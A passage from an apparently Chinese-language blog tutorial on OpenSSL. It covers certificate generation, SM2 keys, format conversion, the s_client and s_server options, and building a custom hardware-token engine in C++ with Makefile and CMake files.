</span><span class="language-bash">Email Address []: 邮件地址</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以直接使用-subj指定subject</span></span><br><span class="line">openssl req -new -x509 -key private/cakey.pem -out cacert.pem -subj &quot;/C=CN/ST=Beijing/L=Haidian/O=Datang/OU=SDT/OU=abc/CN=Shixun/emailAddress=dongzy08@qq.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pem转crt格式</span></span><br><span class="line">openssl x509 -outform der -in cacert.pem -out cacert.crt</span><br></pre></td></tr></table></figure>

<p><strong>2. 生成证书</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######## 生成证书 ###########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同样生成私钥key</span></span><br><span class="line">openssl genrsa -out domain.key 2048</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据key生成证书请求文件</span></span><br><span class="line">openssl req -new -key domain.key -out domain.csr</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将有一些配置需要填写，可以随意填写，因为是自颁发</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Country Name (2 letter code) [AU]: 国家名，自然CN</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">State or Province Name (full name) [Some-State]: 省份名称，比如Hunan</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Locality Name (eg, city) []: 城市名称，比如changsha</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organization Name (eg, company) [Internet Widgits Pty Ltd]: 公司名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Organizational Unit Name (eg, section) []: 部门名称</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Common Name (eg, server FQDN or YOUR name) []: 填写网站的域名</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Email Address []: 邮件地址</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以直接使用-subj指定subject</span></span><br><span class="line">openssl req -new -key domain.key -out domain.csr -subj &quot;/C=CN/ST=Beijing/L=Haidian/O=Datang/OU=SDT/OU=abc/CN=Shixun/emailAddress=dongzy08@qq.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######## 使用ca给证书签名，签了名的证书才是真正的证书 ###########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">签名前需要有几个准备文件</span></span><br><span class="line">mkdir -p demoCA/newcerts</span><br><span class="line">touch demoCA/index.txt</span><br><span class="line">echo 01 &gt; demoCA/serial</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">签名，可以自定义有效天数-days</span></span><br><span class="line">openssl ca -in domain.csr -cert cacert.pem -keyfile private/cakey.pem -days 365 -out domain.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成p12，需要设置密码</span></span><br><span class="line">openssl pkcs12 -export -out domain.p12 -inkey domain.key -in domain.crt</span><br></pre></td></tr></table></figure>

<h4 id="2-中国密码标准（国密）"><a href="#2-中国密码标准（国密）" class="headerlink" title="(2) 中国密码标准（国密）"></a>(2) 中国密码标准（国密）</h4><p><strong>0. 准备工作</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ssl_diy/private</span><br><span class="line">cd ssl_diy</span><br></pre></td></tr></table></figure>

<p><strong>1. 生成用户证书</strong></p>
<ol>
<li>根据椭圆曲线生成密钥</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl_gm ecparam -genkey -name SM2 -out private/root-cakey.pem</span><br></pre></td></tr></table></figure>

<ul>
<li>生成的密钥内容如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN EC PARAMETERS-----</span><br><span class="line">BggqgRzPVQGCLQ==</span><br><span class="line">-----END EC PARAMETERS-----</span><br><span class="line">-----BEGIN EC PRIVATE KEY-----</span><br><span class="line">MHcCAQEEIPS25CUNA9sedtqmVHAkIBhknFUAREy5+eEfg/vkX30noAoGCCqBHM9V</span><br><span class="line">AYItoUQDQgAEnnSjGFJ3LG1qA7wYGpnRxr6palpBtuw4yToNW7QRZKz12s438i1G</span><br><span class="line">Dqxf97ZcfeI6pAxb+e4TOSLu7tIt+wFyng==</span><br><span class="line">-----END EC PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h4 id="3-生成带拓展字段的证书"><a href="#3-生成带拓展字段的证书" class="headerlink" title="(3) 生成带拓展字段的证书"></a>(3) 生成带拓展字段的证书</h4><ul>
<li>需要拷贝一份<code>/etc/ssl/openssl.cnf</code>文件到自己的目录下</li>
<li>修改里面的字段，添加下面的字段</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[ v3_req ]</span></span><br><span class="line"><span class="comment"># 添加下面语句</span></span><br><span class="line"><span class="attr">subjectAltName</span> = @alt_names</span><br><span class="line">...</span><br><span class="line"><span class="comment"># 添加下面块，DNS加几个自己决定</span></span><br><span class="line"><span class="section">[ alt_names ]</span></span><br><span class="line"><span class="attr">DNS.1</span> = www.test.com</span><br><span class="line"><span class="attr">DNS.2</span> = *.aaa.com</span><br></pre></td></tr></table></figure>

<ul>
<li>然后在生成证书（非生成CA）的命令中加上<code>-config /path/to/openssl.cnf</code></li>
<li>签名命令中加上<code>-config /path/to/openssl.cnf -extensions v3_req</code></li>
</ul>
<h3 id="1-2-证书转换"><a href="#1-2-证书转换" class="headerlink" title="1.2. 证书转换"></a>1.2. 证书转换</h3><p><strong>csr（Certificate Signing Request）</strong></p>
<ul>
<li>通常为证书请求，PEM格式编码，包含证书请求信息和公钥，通常是没有签名的证书</li>
</ul>
<p><strong>crt&#x2F;cer（Certificate）</strong></p>
<ul>
<li>通常为被ca机构签名后的证书格式，包含证书本身的信息（证书和公钥）和证书颁发机构的信息</li>
<li>crt一般在linux上使用，cer一般在windows上使用</li>
<li>两种格式都可以使用pem编码或者der编码</li>
</ul>
<p><strong>pem（Privacy-Enhanced Mail）</strong></p>
<ul>
<li>pem是储存证书和密钥的一种格式，一般是base64编码，以<code>-----BEGIN CERTIFICATE-----</code>和<code>-----END CERTIFICATE-----</code>包裹</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pem格式转der格式</span></span><br><span class="line">openssl x509 -outform der -in cert.pem -out cert.der</span><br></pre></td></tr></table></figure>

<p><strong>der（Distinguished Encoding Rules）</strong></p>
<ul>
<li>der是一种二进制格式，通常用于在网络上传输证书。cer（Certificate）是DER编码的X.509证书的扩展名，通常用于Windows操作系统中</li>
<li>der不能使用<code>CERTIFICATE REQUEST</code>的pem转换，需要使用<code>CERTIFICATE</code>转换，也就是需要ca签名后的证书</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">der格式转pem格式</span></span><br><span class="line">openssl x509 -inform der -in cert.der -out cert.pem</span><br></pre></td></tr></table></figure>

<p><strong>p12</strong></p>
<ul>
<li>p12是证书和私钥结合的证书，一般作为设备证书导入使用或者导入为浏览器证书做证书认证使用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 解开p12证书 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只要证书，需要密码</span></span><br><span class="line">openssl pkcs12 -clcerts -nokeys -in cert.p12 -out cert.pem</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只要私钥</span></span><br><span class="line">openssl pkcs12 -nocerts -nodes -in cert.p12 -out key.pem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 生成p12证书 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要私钥+证书生成，需要设置密码</span></span><br><span class="line">openssl pkcs12 -export -out domain.p12 -inkey domain.key -in domain.crt</span><br></pre></td></tr></table></figure>

<h3 id="1-3-验证证书"><a href="#1-3-验证证书" class="headerlink" title="1.3. 验证证书"></a>1.3. 验证证书</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用ca根证书校验客户端证书</span></span><br><span class="line">openssl verify -CAfile root.crt client.pem</span><br></pre></td></tr></table></figure>

<h3 id="1-4-查看证书"><a href="#1-4-查看证书" class="headerlink" title="1.4. 查看证书"></a>1.4. 查看证书</h3><ul>
<li>oid的对照关系可以看<code>node-forge/lib/oids.js</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印证书内容，下面命令传入的是ascii字符版证书</span></span><br><span class="line">openssl x509 -in cert.pem -noout -text</span><br></pre></td></tr></table></figure>

<h2 id="3-客户端-openssl-s-client"><a href="#3-客户端-openssl-s-client" class="headerlink" title="3. 客户端 openssl s_client"></a>3. 客户端 <code>openssl s_client</code></h2><h3 id="3-1-选项"><a href="#3-1-选项" class="headerlink" title="3.1. 选项"></a>3.1. 选项</h3><ul>
<li><code>-engine &lt;name&gt;</code>: 使用引擎，给一些使用硬件加密的代码使用</li>
<li><code>-ssl_client_engine &lt;name&gt;</code>: 使用引擎给客户端需要证书操作时</li>
<li><code>-connect &lt;ip:port&gt;</code>: 连接地址，仅支持ip+端口，不支持url</li>
<li><code>-msg</code>: 显示协议相关的消息体</li>
<li><code>-state</code>: 显示当前ssl的阶段</li>
<li><code>-debug</code>: 额外显示一些输出</li>
<li><code>-tls1_1</code>: 使用tlsv1.1进行通信</li>
<li><code>-cipher &lt;ciphers&gt;</code>: 指定tlsv1.2及以下的套件列表</li>
<li><code>-ciphersuites &lt;ciphers&gt;</code>: 指定tlsv1.3套件列表</li>
<li><code>-key &lt;keyPath&gt;</code>: 如果证书<code>-cert</code>没有带key，需要指定私钥</li>
<li><code>-cert &lt;certPath&gt;</code>: 证书，pem格式</li>
<li><code>-servername &lt;serverName&gt;</code>: 添加tls的extension字段<code>server_name</code></li>
<li><code>-keylogfile &lt;keyfile&gt;</code>: 将预主密钥保存到文件</li>
</ul>
<h3 id="3-2-示例用法"><a href="#3-2-示例用法" class="headerlink" title="3.2. 示例用法"></a>3.2. 示例用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-connect 127.0.0.1:7777   连接127.0.0.1:7777</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-cipher RSA               使用RSA密钥交换算法相关的算法套件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-debug                    开启调试日志</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-keylogfile test.log      将预主密钥保存到test.log</span></span><br><span class="line">openssl s_client -connect 127.0.0.1:7777 -cipher RSA -debug -keylogfile test.log</span><br></pre></td></tr></table></figure>

<h2 id="4-服务端-openssl-s-server"><a href="#4-服务端-openssl-s-server" class="headerlink" title="4. 服务端 openssl s_server"></a>4. 服务端 <code>openssl s_server</code></h2><ul>
<li><code>-accept &lt;port&gt;</code>: 监听端口</li>
<li><code>-tls1_1</code>: 只使用tlsv1.1</li>
<li><code>-cipher &lt;ciphers&gt;</code>: 指定tlsv1.2及以下的套件列表</li>
<li><code>-ciphersuites &lt;ciphers&gt;</code>: 指定tlsv1.3套件列表</li>
<li><code>-state</code>: 显示当前ssl的阶段</li>
<li><code>-CAfile &lt;caPath&gt;</code>: ca根证书路径，用于校验对端证书，pem格式</li>
<li><code>-key &lt;keyPath&gt;</code>: 如果证书<code>-cert</code>没有带key，需要指定私钥</li>
<li><code>-cert &lt;certPath&gt;</code>: 证书，pem格式</li>
<li><code>-verify int</code>: 开启校验对端证书</li>
<li><code>-Verify int</code>: 强制要求对端有证书，并开启校验</li>
<li><code>-verify_return_error</code>: 默认情况下，上面的而校验失败了只会打印日志后继续，加了此选项才会断开连接</li>
<li><code>-WWW</code>: 当前目录作为根目录进行http服务，最简单的http服务，必须输入全路径才能处理包括index.html</li>
</ul>
<h3 id="4-2-示例用法"><a href="#4-2-示例用法" class="headerlink" title="4.2. 示例用法"></a>4.2. 示例用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-accept 7777      监听7777端口</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-tls1_2           使用tlsv1.2及以下加密套件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-state            显示ssl握手阶段</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-debug            显示debug日志</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-key domain.key   证书私钥</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-cert domain.crt  证书和公钥信息</span></span><br><span class="line">openssl s_server -accept 7777 -tls1_2 -state -debug -key domain.key -cert domain.crt</span><br></pre></td></tr></table></figure>

<h1 id="三、openssl库"><a href="#三、openssl库" class="headerlink" title="三、openssl库"></a>三、openssl库</h1><h2 id="1-引擎开发指南"><a href="#1-引擎开发指南" class="headerlink" title="1. 引擎开发指南"></a>1. 引擎开发指南</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1. 简介"></a>1.1. 简介</h3><ul>
<li>引擎库是openssl给一些硬件设备提供的一个标准化开发接口，可以通过编写一些硬件接口对接openssl实现ssl过程中使用硬件进行加解密等操作</li>
<li>一般引擎库再windows上放置位置为<code>C:\Program Files (x86)\OpenSSL\lib\engines-1_1\xxx.dll</code>文件，加载时会根据id找同名dll文件</li>
<li>实现上对于企业用户，使用引擎库可以作为ukey来证书认证或国密加密认证等</li>
<li>ukey不管是普密还是国密，都是无法导出私钥的，证书的认证流程需要使用私钥对证书进行签名，再发送给服务端进行解析，所以引擎库里面不仅需要导出证书接口，还需要实现证书的签名接口，使用ukey的签名接口进行签名</li>
<li>skf转openssl结构体参考仓库: <a href="https://github.com/guanzhi/GmSSL">https://github.com/guanzhi/GmSSL</a></li>
</ul>
<h3 id="1-2-基础接口"><a href="#1-2-基础接口" class="headerlink" title="1.2. 基础接口"></a>1.2. 基础接口</h3><ul>
<li>加载引擎必须要定义的下面几个函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/******************** 这个函数是引擎设置的最基础的函数 ********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Constants used when creating the ENGINE */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* engine_id = <span class="string">&quot;skf&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Prepare the ENGINE structure for registration */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">skf_bind_helper</span><span class="params">(ENGINE* e)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(Tag, <span class="string">&quot;skf_bind_helper&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set skf rsa engine method, use default method and diy some function</span></span><br><span class="line">    <span class="keyword">if</span> ((skf_rsa_method = <span class="built_in">RSA_meth_dup</span>(<span class="built_in">RSA_get_default_method</span>())) == <span class="literal">NULL</span> ||</span><br><span class="line">        <span class="comment">// 私钥加密函数</span></span><br><span class="line">        <span class="built_in">RSA_meth_set_priv_enc</span>(skf_rsa_method, skf_rsa_priv_enc) == <span class="number">0</span> ||</span><br><span class="line">        <span class="built_in">RSA_meth_set_sign</span>(skf_rsa_method, my_sign) == <span class="number">0</span> ||</span><br><span class="line">        <span class="built_in">RSA_meth_set_verify</span>(skf_rsa_method, my_verify) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ENGINE_set_id</span>(e, engine_id) ||                     <span class="comment">// 引擎id</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_name</span>(e, engine_name) ||                 <span class="comment">// 引擎名字</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_init_function</span>(e, engine_init) ||        <span class="comment">// 初始化函数，握手前调用</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_finish_function</span>(e, engine_finish) ||    <span class="comment">// 结束函数，连接完成不再需要引擎时调用</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_destroy_function</span>(e, engine_destroy) ||  <span class="comment">// 销毁函数，结束时调用，只会被调用一次</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_RSA</span>(e, skf_rsa_method) ||               <span class="comment">// 设置rsa算法结构体</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_EC</span>(e, &amp;skf_ecc_meth) ||                 <span class="comment">// 设置rsa算法结构体</span></span><br><span class="line">        <span class="comment">// if not set, sdf will load by default if possible</span></span><br><span class="line">        <span class="comment">// !ENGINE_set_flags(e, ENGINE_FLAGS_NO_REGISTER_ALL) ||</span></span><br><span class="line">        !<span class="built_in">ENGINE_set_load_ssl_client_cert_function</span>(e, skf_load_ssl_client_cert)  <span class="comment">// 设置客户端证书加载函数</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/****************** 下面是给openssl库的标准接口，必须定义的 ********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This stuff is needed if this ENGINE is being compiled into a self-contained</span></span><br><span class="line"><span class="comment"> * shared-library. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> OPENSSL_NO_DYNAMIC_ENGINE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/engine.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">bind_helper</span><span class="params">(ENGINE* e, <span class="type">const</span> <span class="type">char</span>* id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (id &amp;&amp; (<span class="built_in">strcmp</span>(id, engine_id) != <span class="number">0</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">skf_bind_helper</span>(e)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">IMPLEMENT_DYNAMIC_CHECK_FN</span>()</span><br><span class="line"><span class="built_in">IMPLEMENT_DYNAMIC_BIND_FN</span>(bind_helper)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="type">static</span> ENGINE* <span class="title">engine_skf</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    ENGINE* eng = <span class="built_in">ENGINE_new</span>();</span><br><span class="line">    <span class="keyword">if</span> (!eng) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">skf_bind_helper</span>(eng)) &#123;</span><br><span class="line">        <span class="built_in">ENGINE_free</span>(eng);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eng;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">engine_load_skf_int</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    ENGINE* toadd = <span class="built_in">engine_skf</span>();</span><br><span class="line">    <span class="keyword">if</span> (!toadd) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">ENGINE_add</span>(toadd);</span><br><span class="line">    <span class="built_in">ENGINE_free</span>(toadd);</span><br><span class="line">    <span class="built_in">ERR_clear_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* OPENSSL_NO_DYNAMIC_ENGINE */</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>编译出来的引擎库名字和设置中的<code>engine_id</code>要一致</li>
</ul>
<h3 id="1-3-编译"><a href="#1-3-编译" class="headerlink" title="1.3. 编译"></a>1.3. 编译</h3><ul>
<li>在openssl的源码根目录下新建一个文件夹放引擎代码，就假设是<code>my-engine</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my-engine</span><br><span class="line">├── CMakeLists.txt</span><br><span class="line">├── ecc.cpp</span><br><span class="line">├── ecc.h</span><br><span class="line">├── e_skf.cpp</span><br><span class="line">├── log.hpp</span><br><span class="line">└── Makefile</span><br></pre></td></tr></table></figure>

<h4 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h4><ul>
<li>makefile暂时只支持linux的gcc编译</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc</span><br><span class="line">CXX = g++</span><br><span class="line">CFLAGS = -g -fPIC -Wall -Werror -Wshadow -Wno-unused-function -std=c11</span><br><span class="line">CXXFLAGS = -g -fPIC -Wall -Wshadow -Wno-unused-function -std=c++14</span><br><span class="line">LFLAGS = -shared -fPIC</span><br><span class="line"></span><br><span class="line"><span class="comment">#要编译的目标</span></span><br><span class="line">TARGET = skf.so</span><br><span class="line"><span class="comment">#源文件路径，跟makefile文件同目录不用填，目录使用/结束</span></span><br><span class="line">SRCDIR = ./</span><br><span class="line"><span class="comment">#编译中间文件路径，跟SRCDIR目录不用填，目录使用/结束</span></span><br><span class="line">OBJDIR =</span><br><span class="line"><span class="comment">#链接库路径，带上-L，-L../</span></span><br><span class="line">LIB_DIRS = -L../</span><br><span class="line"><span class="comment">#链接库名，带上-l，-lsvpn 静态库填写绝对路径</span></span><br><span class="line">LIB = -lssl -lcrypto</span><br><span class="line"><span class="comment">#引用头文件路径，带上-I， -I$(PREFIX_INC)</span></span><br><span class="line">INCLUDE = -I../<span class="keyword">include</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果为空，就是当前目录</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(SRCDIR)</span>,)</span><br><span class="line">	SRCDIR += ./</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面四个命令通过模式匹配获取当前目录下的所有C,CPP,O文件</span></span><br><span class="line">CPP_SOURCES = <span class="variable">$(<span class="built_in">foreach</span> d,<span class="variable">$(SRCDIR)</span>,$(<span class="built_in">wildcard</span> <span class="variable">$(d)</span>*.cpp)</span>)</span><br><span class="line">C_SOURCES = <span class="variable">$(<span class="built_in">foreach</span> d,<span class="variable">$(SRCDIR)</span>,$(<span class="built_in">wildcard</span> <span class="variable">$(d)</span>*.c)</span>)</span><br><span class="line">CPP_OBJS = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, <span class="variable">$(OBJDIR)</span>%.o, <span class="variable">$(CPP_SOURCES)</span>)</span></span><br><span class="line">C_OBJS = <span class="variable">$(<span class="built_in">patsubst</span> %.c, <span class="variable">$(OBJDIR)</span>%.o, <span class="variable">$(C_SOURCES)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面把一些其他目录下的源文件也放到里面</span></span><br><span class="line">SOURCES += <span class="variable">$(CPP_SOURCES)</span> <span class="variable">$(C_SOURCES)</span> $(OBJS:%.o=%.c*)</span><br><span class="line">OBJS += <span class="variable">$(CPP_OBJS)</span> <span class="variable">$(C_OBJS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean all cp cpp cpso _clean _all _install test</span></span><br><span class="line"></span><br><span class="line"><span class="section">.SUFFIXES: .c .cpp .o</span></span><br><span class="line"></span><br><span class="line"><span class="section">.c.o:</span></span><br><span class="line">	<span class="variable">$(CC)</span> -c <span class="variable">$*</span>.c -o <span class="variable">$*</span>.o <span class="variable">$(INCLUDE)</span> <span class="variable">$(CFLAGS)</span></span><br><span class="line"><span class="section">.cpp.o:</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -c <span class="variable">$*</span>.cpp -o <span class="variable">$*</span>.o <span class="variable">$(INCLUDE)</span> <span class="variable">$(CXXFLAGS)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(_all)</span></span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJS)</span></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(CPP_OBJS)</span>,)</span><br><span class="line">	<span class="variable">$(CC)</span>  <span class="variable">$(LFLAGS)</span> -o <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> <span class="variable">$(LIB_DIRS)</span> <span class="variable">$(LIB)</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(LFLAGS)</span> -o <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span> <span class="variable">$(LIB_DIRS)</span> <span class="variable">$(LIB)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean: <span class="variable">$(_clean)</span></span></span><br><span class="line">	rm -f <span class="variable">$(OUTDIR)</span><span class="variable">$(TARGET)</span> <span class="variable">$(OBJS)</span></span><br></pre></td></tr></table></figure>

<h4 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h4><ul>
<li>编写CMakeLists.txt，在windows上使用msvc编译的openssl主程序就需要使用msvc编译引擎</li>
<li>linux就使用gcc即可</li>
</ul>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cmake最小支持版本3.8</span></span><br><span class="line"><span class="keyword">CMAKE_MINIMUM_REQUIRED</span>(VERSION <span class="number">3.8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 项目工程名字</span></span><br><span class="line"><span class="keyword">PROJECT</span>(skf</span><br><span class="line">    LANGUAGES C CXX</span><br><span class="line">    VERSION <span class="number">1.0</span>.<span class="number">0.0</span></span><br><span class="line">    DESCRIPTION <span class="string">&quot;skf engine&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译命令导出json给其他地方使用</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_EXPORT_COMPILE_COMMANDS <span class="keyword">ON</span>)</span><br><span class="line"><span class="comment"># 设置C++标准</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span>(SRC_FILES)</span><br><span class="line"><span class="keyword">FILE</span>(GLOB SRC_FILES ./*.c*)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_library</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> SHARED <span class="variable">$&#123;SRC_FILES&#125;</span>)</span><br><span class="line"><span class="keyword">set_target_properties</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> PROPERTIES PREFIX <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_include_directories</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> PRIVATE</span><br><span class="line">    ../<span class="keyword">include</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_directories</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> PRIVATE</span><br><span class="line">    ../</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (MSVC)</span><br><span class="line">    <span class="keyword">target_compile_options</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> PRIVATE</span><br><span class="line">        /wd4819 <span class="comment"># 对msvc关闭uincode的warning提示</span></span><br><span class="line">        /wd4996 <span class="comment"># 对msvc关闭unsafe func的提示</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">target_link_libraries</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> PRIVATE</span><br><span class="line">        libssl</span><br><span class="line">        libcrypto</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">else</span>()</span><br><span class="line">    <span class="keyword">target_link_libraries</span>(<span class="variable">$&#123;PROJECT_NAME&#125;</span> PRIVATE</span><br><span class="line">        ssl crypto</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">endif</span>()</span><br></pre></td></tr></table></figure>

<h3 id="1-4-加载引擎"><a href="#1-4-加载引擎" class="headerlink" title="1.4. 加载引擎"></a>1.4. 加载引擎</h3><p><strong>libcurl调用</strong></p>
<ul>
<li>curl引擎设置如下</li>
</ul>
